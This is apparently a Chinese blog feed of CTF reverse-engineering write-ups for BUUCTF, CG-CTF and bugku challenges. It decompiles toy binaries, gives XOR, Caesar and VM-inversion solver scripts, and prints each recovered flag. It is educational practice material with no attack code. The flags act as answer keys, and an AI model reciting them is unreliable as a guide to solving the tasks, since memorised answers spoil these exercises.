        <content type="html"><![CDATA[<p>看到有些大佬在做BUUCTF的题，看了一下，题目很多，但是感觉良莠不齐，并且开始的一些题目有些太简单了，就当是多做些题目了。</p><span id="more"></span><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p>确实非常easy，直接拖进IDA看到flag</p><pre><code class="flag">flag&#123;this_Is_a_EaSyRe&#125;</code></pre><h4 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h4><p>IDA打开，通过字符串窗口找到主程序，整个程序流程很简单</p><pre><code class="c++">for ( j = 0; ; ++j )  &#123;    v8 = j;    v2 = j_strlen(Str2);    if ( v8 &gt; v2 )      break;    if ( Str2[j] == &#39;o&#39; )      Str2[j] = &#39;0&#39;;  &#125;  sub_1400111D1(&quot;input the flag:&quot;);  sub_14001128F(&quot;%20s&quot;, &amp;Str1);  v3 = j_strlen(Str2);  if ( !strncmp(&amp;Str1, Str2, v3) )    sub_1400111D1(&quot;this is the right flag!\n&quot;);  else    sub_1400111D1(&quot;wrong flag\n&quot;);</code></pre><p>只有这一部分有用，str2时内存中的一个字符串，只是将输入的字符串和变换过后的str2进行一个简单的对比，一样则输出正确</p><p>str2的变换就是将所有的o变换成0，str2为‘{hello_world}’，所以flag为</p><pre><code class="flag">flag&#123;hell0_w0rld&#125;</code></pre><h4 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h4><p>和上一题完全一样，只不过时ELF64文件，把i和r全部替换成了1</p><pre><code class="flag">flag&#123;hack1ng_fo1_fun&#125;</code></pre><h4 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h4><p>安卓逆向，直接apktool反编译，在MainActivity.smail文件里找到了flag</p><pre><code class="flag">flag&#123;7631a988259a00816deda84afb29430a&#125;</code></pre><h4 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h4><p>简单加壳软件，在加壳时没做任何的修改，直接upx脱壳，IDA反编译，通过字符串直接找到flag</p><pre><code>flag&#123;HappyNewYear!&#125;</code></pre><h4 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h4><p>IDA反编译可以直接发现flag，把花括号里的放进flag{}里即可</p><pre><code>flag&#123;49d3c93df25caad81232130f3d2ebfad&#125;</code></pre><h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><p>一看题目就是到要逆运算异或，反编译之后发现关键运算</p><pre><code class="c++">for ( i = 1; i &lt; 33; ++i )    v6[i] ^= v6[i - 1];  v3 = global;  if ( !strncmp(v6, global, 0x21uLL) )    printf(&quot;Success&quot;, v3);</code></pre><p>所以逆运算就好了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() &#123;    unsigned char ida_chars[] =            &#123;                    0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,                    0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,                    0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,                    0x47, 0x32, 0x4F            &#125;;    string flag;    flag+=ida_chars[0];    for(int i=1;i&lt;33;i++)        &#123;            flag+=(ida_chars[i]^ida_chars[i-1]);        &#125;    cout&lt;&lt;flag&lt;&lt;endl;    return 0;&#125;</code></pre><p>直接输出flag</p><pre><code>flag&#123;QianQiuWanDai_YiTongJiangHu&#125;</code></pre><h4 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h4><p>和bugku的love是同一个题，不再赘述</p><h4 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h4><p>比较简单的的迷宫题，上下左右全部都标示的清清楚楚</p><p><img src="https://s2.ax1x.com/2020/02/13/1q9kRI.png" alt="不一样的flag-1"></p><p>迷宫如下图</p><p><img src="https://s2.ax1x.com/2020/02/13/1q9Azt.png" alt="不一样的flag-2"></p><pre><code>*11110100001010000101111#</code></pre><p>转换成5*5的方阵，*走到#即可</p><pre><code>flag&#123;222441144222&#125;</code></pre><h4 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h4><p>IDA反编译出来，发现需要输入8位，经过sub_4010F0这个函数的变换后，在经过两个base64变换（查看函数内部自己发现），满足条件即正确</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpTZF.png" alt="刮开有奖-1"></p><p>sub_4010F0这个函数内容比较多，但是和输入的字符串无关，所以直接直接把函数实现然后求出来正确的取值就可以了（后面的条件略多，这里的变换实际上只需要第一位和第五位）</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int __cdecl decrypt(char *a1, int a2, int a3) &#123;    int result; // eax    int i; // esi    int v5; // ecx    int v6; // edx    result = a3;    for (i = a2; i &lt;= a3; a2 = i) &#123;        v5 = i;        v6 = a1[i];        if (a2 &lt; result &amp;&amp; i &lt; result) &#123;            do &#123;                if (v6 &gt; a1[result]) &#123;                    if (i &gt;= result)                        break;                    ++i;                    a1[v5] = a1[result];                    if (i &gt;= result)                        break;                    while (a1[result] &lt;= v6) &#123;                        if (++i &gt;= result)                            goto LABEL_13;                    &#125;                    if (i &gt;= result)                        break;                    v5 = i;                    a1[result] = a1[i];                &#125;                --result;            &#125; while (i &lt; result);        &#125;        LABEL_13:        a1[result] = v6;        decrypt(a1, a2, i - 1);        result = a3;        ++i;    &#125;    return result;&#125;char v9[20] = &#123;90, 74, 83, 69, 67, 97, 78, 72, 51, 110, 103&#125;;int main() &#123;    cout &lt;&lt; v9 &lt;&lt; endl;    decrypt(v9, 0, 10);    cout &lt;&lt; v9 &lt;&lt; endl;    return 0;&#125;</code></pre><p>输出如图所示</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpIqU.png" alt="刮开有奖-2"></p><p>接着分析下面的部分</p><pre><code class="c++">if ( String == v9 + 34         // 第一位等于51+34=85--&gt;&#39;U&#39;        &amp;&amp; v21 == v13         //第2位，等于v13,即sub_4010F0函数返回值的第5位值--&gt;&#39;J&#39;        &amp;&amp; 4 * v22 - 141 == 3 * v11        &amp;&amp; v23 / 4 == 2 * (v16 / 9)        &amp;&amp; !strcmp(v6, &quot;ak1w&quot;)       // 第6,7,8个字符base64之后，等于ak1w        &amp;&amp; !strcmp(v7,&quot;V1Ax&quot;)        // 第3,4,5个字符，base64之后等于V1Ax   )      &#123;        MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0);      &#125;</code></pre><p>还多了两个条件就检验正确就可以了</p><p>得到flag</p><pre><code>flag&#123;UJWP1jMp&#125;</code></pre><h4 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h4><p>这题没什么难度，IDA打开</p><pre><code class="c++">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3; // eax  char v4; // [rsp+Fh] [rbp-1h]  while ( 1 )  &#123;    while ( 1 )    &#123;      printf(&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv, envp);      v4 = getchar();      if ( v4 != &#39;d&#39; &amp;&amp; v4 != &#39;D&#39; )        break;      Decry();    &#125;    if ( v4 == &#39;q&#39; || v4 == &#39;Q&#39; )      Exit();    puts(&quot;Input fault format!&quot;);    v3 = getchar();    putchar(v3);  &#125;&#125;</code></pre><p>main函数里面没有什么需要注意的东西，解决问题的重点就都放在Decry()这个函数里了</p><pre><code class="c++">unsigned __int64 Decry()&#123;  char v1; // [rsp+Fh] [rbp-51h]  int v2; // [rsp+10h] [rbp-50h]  int v3; // [rsp+14h] [rbp-4Ch]  int i; // [rsp+18h] [rbp-48h]  int v5; // [rsp+1Ch] [rbp-44h]  char src[8]; // [rsp+20h] [rbp-40h]  __int64 v7; // [rsp+28h] [rbp-38h]  int v8; // [rsp+30h] [rbp-30h]  __int64 v9; // [rsp+40h] [rbp-20h]  __int64 v10; // [rsp+48h] [rbp-18h]  int v11; // [rsp+50h] [rbp-10h]  unsigned __int64 v12; // [rsp+58h] [rbp-8h]  v12 = __readfsqword(0x28u);  *(_QWORD *)src = &#39;SLCDN&#39;;  v7 = 0LL;  v8 = 0;  v9 = &#39;wodah&#39;;  v10 = 0LL;  v11 = 0;  text = join(key3, (const char *)&amp;v9);         // text=killshadow  strcpy(key, key1);                            // key=key1=&#39;ADSFK&#39;  strcat(key, src);                             // key=&#39;ADSFKNDCLS&#39;  v2 = 0;  v3 = 0;  getchar();  v5 = strlen(key);  for ( i = 0; i &lt; v5; ++i )  &#123;    if ( key[v3 % v5] &gt; &#39;@&#39; &amp;&amp; key[v3 % v5] &lt;= &#39;Z&#39; )      key[i] = key[v3 % v5] + 32;    ++v3;  &#125;                                             // 转换为小写                                                // key=&#39;adsfkndcls&#39;  printf(&quot;Please input your flag:&quot;, src);  while ( 1 )  &#123;    v1 = getchar();    if ( v1 == &#39;\n&#39; )                           // 遇到回车结束      break;    if ( v1 == &#39; &#39; )                            // 跳过空格    &#123;      ++v2;    &#125;    else    &#123;      if ( v1 &lt;= 96 || v1 &gt; 122 )      &#123;        if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 )              // 大写字母          str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;      &#125;      else                                      // 小写字母      &#123;        str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;      &#125;      if ( !(v3 % v5) )        putchar(32);      ++v2;    &#125;  &#125;  if ( !strcmp(text, str2) )    puts(&quot;Congratulation!\n&quot;);  else    puts(&quot;Try again!\n&quot;);  return __readfsqword(0x28u) ^ v12;&#125;</code></pre><p>需要注意src和v9本身是以long long类型赋值，转换成字符串要记得逆序，接下来的过程就很简单了，程序的过程很清楚，直接逆向运算就可以算出来结果了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main(void) &#123;    int n = 0, v5 = 10, v3 = 10, v2 = 0;    char v1;    char flag[11] = &#123;0&#125;;    char key[] = &quot;adsfkndcls&quot;;    char text[] = &quot;killshadow&quot;;//通过放缩，j只能取0-3之间    for (int j = 0; j &lt; 4; ++j) &#123;        for (v2 = 0; v2 &lt; 10; ++v2) &#123;            v1 = text[v2] - 97 + 26 * j - 97 + key[v3++ % v5] + 39;            if ((v1 &gt;= 65 &amp;&amp; v1 &lt;= 90) || (v1 &gt;= 97 &amp;&amp; v1 &lt;= 122)) &#123;                flag[v2] = v1;                if (++n == 10) &#123;                    printf(&quot;flag&#123;%s&#125;\n&quot;, flag);                    return 0;                &#125;            &#125;        &#125;    &#125;    return 0;&#125;</code></pre><p>这里的j是用来逆向取余运算时候遍历，放缩之后得到一个范围，然后计算就可以了</p><pre><code>flag&#123;KLDQCUDFZO&#125;</code></pre><h4 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h4><p>第一次做Java逆向，顺便也熟悉熟悉Java，所以逆向程序也是用Java写的</p><p>附件打开是class文件，IDEA直接可以反编译，反编译出来的代码很简单</p><pre><code class="java">import java.util.ArrayList;import java.util.Scanner;public class Reverse &#123;    public Reverse() &#123;    &#125;    public static void main(String[] args) &#123;        Scanner s = new Scanner(System.in);        System.out.println(&quot;Please input the flag ：&quot;);        String str = s.next();        System.out.println(&quot;Your input is ：&quot;);        System.out.println(str);        char[] stringArr = str.toCharArray();        Encrypt(stringArr);    &#125;    public static void Encrypt(char[] arr) &#123;        ArrayList&lt;Integer&gt; Resultlist = new ArrayList();        for(int i = 0; i &lt; arr.length; ++i) &#123;            int result = arr[i] + 64 ^ 32;            Resultlist.add(result);        &#125;        int[] KEY = new int[]&#123;180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65&#125;;        ArrayList&lt;Integer&gt; KEYList = new ArrayList();        for(int j = 0; j &lt; KEY.length; ++j) &#123;            KEYList.add(KEY[j]);        &#125;        System.out.println(&quot;Result:&quot;);        if (Resultlist.equals(KEYList)) &#123;            System.out.println(&quot;Congratulations！&quot;);        &#125; else &#123;            System.err.println(&quot;Error！&quot;);        &#125;    &#125;&#125;</code></pre><p>把KEY每个值都减去64^32就好了，没什么难度，所以试试用Java写，练练手</p><pre><code class="java">package com.company;import java.util.ArrayList;public class Main &#123;    public static void main(String[] args) &#123;        int[] KEY = new int[]&#123;180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65&#125;;        ArrayList&lt;Integer&gt; resultList = new ArrayList&lt;&gt;();        for (int value : KEY) &#123;            resultList.add(value - 64 ^ 32);        &#125;//        System.out.println(resultList);        StringBuilder s = new StringBuilder();        for (int value:resultList)&#123;            s.append((char)value);        &#125;        System.out.println(&quot;flag&#123;&quot;+s+&quot;&#125;&quot;);    &#125;&#125;</code></pre><p>直接输出flag</p><pre><code>flag&#123;This_is_the_flag_!&#125;</code></pre><h4 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h4><p>不管是apktool反编译还是直接cfr反编译到代码，都可以找到一串很像flag的字符数组</p><pre><code>pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;</code></pre><p>直接凯撒密码解密，a与k之间相差10，所以key=10</p><pre><code>flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</code></pre><h4 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h4><p>直接<a href="http://tool.chacuo.net/cryptrsakeyparse">解析公钥</a>，然后暴力分解解密就可以了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CGCTF-re部分题解</title>
      <link href="/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>CG-CTF是南邮的平台，题目都很不错，这里记录一下部分题解决题目的思路和方法</p><span id="more"></span><h4 id="Hello-RE"><a href="#Hello-RE" class="headerlink" title="Hello,RE!"></a>Hello,RE!</h4><p>打开程序，发现输入flag，用OD打开，注意到是将输入的字符串和flag直接进行比较，所以单步调试直接找到flag<br><img src="https://s2.ax1x.com/2020/02/13/1qp7a4.png" alt="Hello,RE!-1"></p><h4 id="ReadAsm2"><a href="#ReadAsm2" class="headerlink" title="ReadAsm2"></a>ReadAsm2</h4><p>这题考的是直接读汇编的能力，代码贴在下面</p><pre><code class="c++">int main(int argc, char const *argv[])&#123;  char input[] = &#123;0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,                  0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,                  0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c&#125;;  func(input, 28);  printf(&quot;%s\n&quot;,input+1);  return 0;&#125;</code></pre><pre><code class="asm">00000000004004e6 &lt;func&gt;:  4004e6: 55                    push   rbp  4004e7: 48 89 e5              mov    rbp,rsp  4004ea: 48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi  4004ee: 89 75 e4              mov    DWORD PTR [rbp-0x1c],esi  4004f1: c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1  4004f8: eb 28                 jmp    400522 &lt;func+0x3c&gt;  4004fa: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]  4004fd: 48 63 d0              movsxd rdx,eax  400500: 48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]  400504: 48 01 d0              add    rax,rdx  400507: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]  40050a: 48 63 ca              movsxd rcx,edx  40050d: 48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]  400511: 48 01 ca              add    rdx,rcx  400514: 0f b6 0a              movzx  ecx,BYTE PTR [rdx]  400517: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]  40051a: 31 ca                 xor    edx,ecx  40051c: 88 10                 mov    BYTE PTR [rax],dl  40051e: 83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1  400522: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]  400525: 3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]  400528: 7e d0                 jle    4004fa &lt;func+0x14&gt;  40052a: 90                    nop  40052b: 5d                    pop    rbp  40052c: c3                    ret</code></pre><p>发现这段汇编的作用就是实现input[i]^i，所以实现上面代码输出得到flag</p><pre><code class="python">s = [0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,     0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,     0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66, 0x1c]for i in range(len(s)):    s[i] ^= iout = &#39;&#39;for i in range(len(s)):    out += chr(s[i])print(out)</code></pre><p>输出flag为：</p><pre><code class="flag">flag&#123;read_asm_is_the_basic&#125;</code></pre><h4 id="Py交易"><a href="#Py交易" class="headerlink" title="Py交易"></a>Py交易</h4><p>本题是python的反编译，使用在线工具或uncompyle6将pyc文件反编译，得到代码</p><pre><code class="python">import base64def encode(message):    s = &#39;&#39;    for i in message:        x = ord(i) ^ 32        x = x + 16        s += chr(x)    return base64.b64encode(s)correct = &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;flag = &#39;&#39;print &#39;Input flag:&#39;flag = raw_input()if encode(flag) == correct:    print &#39;correct&#39;else:    print &#39;wrong&#39;import base64def encode(message):    s = &#39;&#39;    for i in message:        x = ord(i) ^ 32        x = x + 16        s += chr(x)    return base64.b64encode(s)correct = &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;flag = &#39;&#39;print &#39;Input flag:&#39;flag = raw_input()if encode(flag) == correct:    print &#39;correct&#39;else:    print &#39;wrong&#39;</code></pre><p>研究代码，发现我们只要将correct逆向解密，就可以得到正确的flag，所以得到如下exp：</p><pre><code class="python">import base64correct = &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;correct = str(base64.b64decode(correct))  # ^SdVkT#S ]`Y\\!^)\x8f\x80ism# print(correct)correct = &#39;^SdVkT#S ]`Y\\!^)\x8f\x80ism&#39;flag = &#39;&#39;for s in correct:    x = ord(s)    x -= 16    i = chr(x ^ 32)    flag += iprint(flag)</code></pre><p>输出flag为：</p><pre><code class="flag">nctf&#123;d3c0mpil1n9_PyC&#125;</code></pre><h4 id="WxyVM"><a href="#WxyVM" class="headerlink" title="WxyVM"></a>WxyVM</h4><p>下载下来不知道是什么文件，记事本打开，开头ELF，所以直接拖进IDA反编译，main函数如下：</p><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  char v4; // [rsp+Bh] [rbp-5h]  signed int i; // [rsp+Ch] [rbp-4h]  puts(&quot;[WxyVM 0.0.1]&quot;);  puts(&quot;input your flag:&quot;);  scanf(&quot;%s&quot;, &amp;byte_604B80);  v4 = 1;  sub_4005B6();  if ( strlen(&amp;byte_604B80) != 24 )    v4 = 0;  for ( i = 0; i &lt;= 23; ++i )  &#123;    if ( *(&amp;byte_604B80 + i) != dword_601060[i] )      v4 = 0;  &#125;  if ( v4 )    puts(&quot;correct&quot;);  else    puts(&quot;wrong&quot;);  return 0LL;&#125;</code></pre><p>一开始认为需要输入一个24位的flag，然后和dword_601060每一位都相等即可，但是中间的sub_4005B6()函数对我们输入的flag还进行了一些变换，所以需要把dword_601060对应的进行反变换才能得到应该输入的正确的flag</p><p>sub_4005B6()函数如下：</p><pre><code class="c++">__int64 sub_4005B6()&#123;  unsigned int v0; // ST04_4  __int64 result; // rax  signed int i; // [rsp+0h] [rbp-10h]  char v3; // [rsp+8h] [rbp-8h]  for ( i = 0; i &lt;= 14999; i += 3 )  &#123;    v0 = byte_6010C0[i];    v3 = byte_6010C0[i + 2];    result = v0;    switch ( v0 )    &#123;      case 1u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) += v3;        break;      case 2u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) -= v3;        break;      case 3u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) ^= v3;        break;      case 4u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) *= v3;        break;      case 5u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) ^= *(&amp;byte_604B80 + byte_6010C0[i + 2]);        break;      default:        continue;    &#125;  &#125;  return result;&#125;</code></pre><p>用IDA将byte_6010C0导出，用python进行逆向处理</p><pre><code class="python">s = [0xc4, 0x34, 0x22, 0xb1, 0xd3, 0x11, 0x97, 0x7, 0xdb, 0x37, 0xc4, 0x6, 0x1d, 0xfc, 0x5b, 0xed, 0x98, 0xdf, 0x94,0xd8, 0xb3, 0x84, 0xcc, 0x8]# dword与char比较，只取最后一位一个字节with open(&#39;export_results.txt&#39;) as f: #文件里是导出的byte_6010C0    t = f.read().split(&#39; &#39;)# print(len(t))for i in range(5000):    v0 = int(t[3 * (4999 - i)], 16)    v3 = int(t[3 * (4999 - i) + 2], 16)    result = int(t[3 * (4999 - i) + 1], 16)    if v0 == 1:        s[result] -= v3    elif v0 == 2:        s[result] += v3    elif v0 == 3:        s[result] ^= v3    elif v0 == 4:        s[result] /= v3    elif v0 == 5:        s[result] ^= s[v3]    else:        continueprint(&#39;&#39;.join([str(chr(int(i) % 128)) for i in s]))</code></pre><p>这里有两件事需要注意，第一是dword只需要取最后一个字节，第二是逆运算时要从最后三位向前计算，最后输出flag: </p><pre><code class="flag">nctf&#123;Embr4ce_Vm_j0in_R3&#125;</code></pre><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>极其无聊的迷宫题……</p><p>找到地图、起点终点和上下左右分别对应的键就可以了</p><pre><code>nctf&#123;o0oo00O000oooo..OO&#125;</code></pre><h4 id="WxyVM2"><a href="#WxyVM2" class="headerlink" title="WxyVM2"></a>WxyVM2</h4><p>拖进IDA反编译，发现函数非常大，操作特别多，但是仔细看发现最后要验证的都是byte类型，所有对dword的操作都是无效的，所以把所有操作拷贝到文件(export_results.txt)中，先进行过滤操作，过滤出需要的操作,最后的验证过程如下：</p><pre><code class="C++">for ( i = 0; i &lt;= 24; ++i )  &#123;    if ( *(&amp;byte_694100 + i) != dword_694060[i] )      v4 = 0;  &#125;  if ( v4 )    puts(&quot;correct&quot;);  else    puts(&quot;wrong&quot;);  return 0LL;</code></pre><p>所以操作之后的数组和dword_694060数组的每个数的最后一位相同，将数组导出，进行逆运算得到原来输入的flag，python代码如下：</p><pre><code class="python">import rewith open(&#39;export_results.txt&#39;) as f:    s = &#39;&#39;    a = f.readline()    while a:        if re.match(r&#39;(.*)byte_6941(.*);&#39;, a):            s += a        a = f.readline()    with open(&#39;s.txt&#39;, &#39;w+&#39;) as ff:        s = s.split(&#39;\n&#39;)        n = len(s)        # print(len(s))        # print(s)        for i in range(n):            ff.write(s[n - 1 - i].strip() + &#39;\n&#39;)ss = [0xC0, 0x85, 0xF9, 0x6C, 0xE2, 0x14, 0xBB, 0xe4, 0xd, 0x59, 0x1c, 0x23, 0x88, 0x6e, 0x9b, 0xca, 0xba, 0x5c, 0x37,      0xfff, 0x48, 0xd8, 0x1f, 0xab, 0xa5]with open(&#39;s.txt&#39;) as f:    a = f.readline()    while a:        # print(re.match(r&#39;(.*)byte_6941(.*);&#39;, a).groups())        if not re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(1).strip():            s = re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(2).split(&#39; &#39;)            # print(s)            i = int(s[0], 16)            # print(i)            i1 = str(ss[i])            if s[1] == &#39;+=&#39;:                sub = &#39;-&#39;            elif s[1] == &#39;-=&#39;:                sub = &#39;+&#39;            else:                sub = &#39;^&#39;            if re.match(r&#39;(.*)u&#39;, s[2]):                s2 = re.match(r&#39;(.*)u&#39;, s[2]).group(1)            else:                s2 = s[2]            exp = i1 + sub + s2            ss[i] = eval(exp) % 128        else:            s = re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(2).split(&#39; &#39;)            # print(s)            i = int(s[0], 16)            # print(i)            i1 = str(ss[i])            if re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(1).strip() == &#39;++&#39;:                sub = &#39;-&#39;            if re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(1).strip() == &#39;--&#39;:                sub = &#39;+&#39;            exp = i1 + sub + &#39;1&#39;            ss[i] = eval(exp) % 128        a = f.readline()    # print(ss)print(&#39;&#39;.join([str(chr(i % 128)) for i in ss]))</code></pre><p>这里要注意一点，python没有++和–操作，所以直接++和–的传唤算不出正确值，在这里卡了一会儿才发现问题。</p><p>运行程序输出flag：</p><pre><code class="flag">nctf&#123;th3_vM_w1th0ut_dAta&#125;</code></pre><h4 id="你大概需要一个优秀的mac"><a href="#你大概需要一个优秀的mac" class="headerlink" title="你大概需要一个优秀的mac"></a>你大概需要一个优秀的mac</h4><p>这是一个macos程序，没法直接打开，所以还是拖进IDA反编译，发现需要输入一个56位的flag，然后经过几个函数处理之后与一个数组进行比较，相同则输入的是正确的flag，所以还是一样进行一个逆运算</p><p>反编译出来的代码如下：</p><pre><code class="c++">  scanf(&quot;%s&quot;, &amp;v4);  if ( strlen(&amp;v4) != 56 )  &#123;    puts((const char *)err);    exit(0);  &#125;  __strcpy_chk(input, &amp;v4, 100LL);  func1((__int64)input);  xfun1();  xfun2();  xfun3();  xfun4();  xfun5();  check();//func1  for ( i = 0; i &lt; 57; ++i ) //这里应该是56？  &#123;    *(_BYTE *)(a1 + i) ^= 0xDEu;  &#125;//xfun1  for ( i = 0; i &lt; 10; ++i )  &#123;    input[i] ^= 0xADu;  &#125;//xfun2  for ( i = 0; i &lt; 10; ++i )  &#123;    input[i + 10] ^= 0xBEu;  &#125;//xfun3  for ( i = 0; i &lt; 10; ++i )  &#123;    input[i + 20] ^= 0xEFu;  &#125;//xfun4  for ( i = 0; i &lt; 10; ++i )  &#123;    input[i + 30] ^= 0xABu;  &#125;//xfun5  for ( i = 0; i &lt; 16; ++i )  &#123;    input[i + 40] ^= 0xEFu;  &#125;//check  memcpy(v2, &amp;byte_100000ED0, 0xE0uLL);  for ( i = 0; i &lt; 56; ++i )  &#123;    if ( (char)input[i] != v2[i] )    &#123;      puts((const char *)err);      exit(0);    &#125;  &#125;</code></pre><p>所以将byte_100000ED0处的数组导出，进行逆运算，代码如下：</p><pre><code class="python">s = [0x15, 0x1F, 0x12, 0x14, 0x08, 0x3A, 0x46, 0x2C, 0x07, 0x1B, 0x51, 0x13, 0x3F, 0x57, 0x08, 0x05, 0x3F, 0x30, 0x32,     0x51, 0x52, 0x02, 0x6E, 0x78, 0x16, 0x7C, 0x6E, 0x61, 0x70, 0x48, 0x1C, 0x3B, 0x32, 0x2A, 0x13, 0x45, 0x07, 0x2A,     0x18, 0x0C, 0x6E, 0x41, 0x70, 0x04, 0x06, 0x6E, 0x5C, 0x00, 0x42, 0x45, 0x70, 0x5A, 0x02, 0x04, 0x0E, 0x4C]for i in range(10):    s[i]^=0xADfor i in range(10,20):    s[i]^=0xBEfor i in range(20,30):    s[i]^=0xEFfor i in range(30,40):    s[i]^=0xABfor i in range(40,56):    s[i]^=0xEFfor i in range(56):    s[i]^=0xDEprint(&#39;&#39;.join([str(chr(i%128)) for i in s]))</code></pre><p>运行程序输出flag：</p><pre><code class="flag">flag&#123;I5_th1s_7he_PR1c3_I&#39;M_PAyiNG_f0r_my_pA57_m1stAk35?&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> CG-CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku-re部分题解</title>
      <link href="/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>这里记录一下bugku平台上一些re题的题解</p><span id="more"></span><h4 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h4><p>直接拖进IDA反编译</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpxsK.png" alt="入门逆向-1"></p><p>直接可以看到flag</p><h4 id="Easy-vb"><a href="#Easy-vb" class="headerlink" title="Easy_vb"></a>Easy_vb</h4><p>IDA或OD反编译，搜索字符串</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpXxx.png" alt="Easy_vb-1"><br>看到有flag样式的字符串，是MCTF比赛的题，bugku上需要提交flag(xxx)，所以把MCTF改成flag{}</p><h4 id="Easy-Re"><a href="#Easy-Re" class="headerlink" title="Easy_Re"></a>Easy_Re</h4><p>用OD调试，搜索字符串，找到需要我们输入字符串的位置：<br><img src="https://s2.ax1x.com/2020/02/13/1qpLGR.png" alt="Easy_Re-1"><br>发现提示语和%s，找到输入字符串的位置，加断点单步调试<br><img src="https://s2.ax1x.com/2020/02/13/1qpOR1.png" alt="Easy_Re-2"><br>程序会把输入的字符串和flag进行比较，相同则通过，在寄存器中找到正确的flag</p><h4 id="游戏过关"><a href="#游戏过关" class="headerlink" 